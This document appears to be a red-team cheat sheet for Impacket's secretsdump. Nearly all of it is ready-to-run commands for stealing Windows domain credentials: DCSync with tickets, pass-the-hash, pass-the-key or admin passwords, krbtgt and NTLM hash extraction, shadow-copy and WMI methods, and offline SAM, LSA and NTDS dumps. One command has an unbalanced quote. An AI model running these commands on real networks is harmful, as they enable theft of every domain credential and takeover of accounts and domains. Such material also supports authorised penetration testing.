# Impacket-secretsdump

## Use this impacket module to dump hashes from the local machine, depending the context of usage

### 1) Remote domain credential dump vis DRSUAPI

Use this if you have an admin TGT

    impacket-secretsdump -k -no-pass DC.DOMAIN.COM 
    
Do DC sync via PtH

    impacket-secretsdump DC.DOMAIN.COM -hashes 'LM_HASH:NTLM_HASH' 

Do DC Sync with Domain Admin credentials

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP 

Do DC Sync with AES Key authentication (Pass-the-Key)

    impacket-secretsdump 'DOMAIN.COM/administrator@DC_IP -aesKey ADMINISTRATOR_AES_KERBEROS_ENCRYPTION_KEY

### 2) Domain credentials only (Skip remote SAM/LSA secrets. DRSUAPI to pull NTDS.dit secrets only)

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -just-dc

### 3) NTLM hashes only

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -just-dc-ntlm

### 4) Single user extraction

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -just-dc-user krbtgt

### 5) Volume Shadow Copy (VSS)

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -use-vss

With WMI + VSS

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -use-vss -exec-method wmiexec

### 6) Filtered DCSync dump

Dump only NTDS.dit domain credentials

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -skip-sam -skip-security

Skip specific users

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -skip-user krbtgt,guest

### 7) Password Last Set

Audits user passwords by appending a timestamp of when the password was last changed

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -just-dc -pwd-last-set

### 8) Account Status

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -just-dc -user-status

### 9) Timestamps

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -ts

### 10) Write file to output

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -outputfile dump
    cat dump.ntds

### 11) Remote shadow snapshot via WMI

    impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP -use-remoteSSWMI

### 12) Dump local SAM hashes

Parse locally exported registry hive files

    impacket-secretsdump -sam SAM -system SYSTEM LOCAL

### 13) Dump LSA Secrets

    impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

### 14) Offline NTDS dump

    impacket-secretsdump -ntds ntds.dit -system system local











